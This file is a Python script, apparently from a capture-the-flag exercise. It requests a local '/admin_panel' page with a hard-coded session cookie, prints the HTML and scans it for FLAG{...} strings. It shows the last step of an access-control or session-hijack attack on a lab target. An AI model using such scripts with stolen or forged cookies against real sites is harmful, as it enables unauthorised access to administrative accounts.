import re, sys
import requests

target_url = "http://127.0.0.1:33166/admin_panel"
session_cookie = "OHPI_Y1N0-W_1RYNCv342OsWzpNdIqQLP9zIlMlvedk"

headers = {
    "Cookie": f"session={session_cookie}",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
}

try:
    print(f"[+] Fetching {target_url}...")
    resp = requests.get(target_url, headers=headers, timeout=15, allow_redirects=False)
    
    print(f"[+] Status Code: {resp.status_code}")
    print(f"[+] Content Length: {len(resp.content)} bytes")
    
    if resp.status_code != 200:
        print(f"[!] Expected 200 OK, got {resp.status_code}")
        if resp.status_code in [301, 302, 303, 307, 308]:
            print(f"[+] Redirect to: {resp.headers.get('Location', 'N/A')}")
    
    print(f"\n[+] Full HTML Content:")
    print("=" * 80)
    raw_html = resp.text
    print(raw_html)
    print("=" * 80)
    
    # Search for FLAG patterns
    flag_matches = list(re.finditer(r'FLAG\{[^}]+\}', raw_html))
    
    if flag_matches:
        print(f"\n[!] Found {len(flag_matches)} FLAG pattern(s):")
        for match in flag_matches:
            print(f"  - {match.group()} at position {match.start()}-{match.end()}")
    else:
        print(f"\n[!] No FLAG patterns found")
        
except requests.exceptions.ConnectionError as e:
    print(f"[!] Connection Error: {e}")
    sys.exit(1)
except requests.exceptions.Timeout:
    print(f"[!] Timeout while connecting to {target_url}")
    sys.exit(1)
except Exception as e:
    print(f"[!] Error: {e}")
    sys.exit(1)
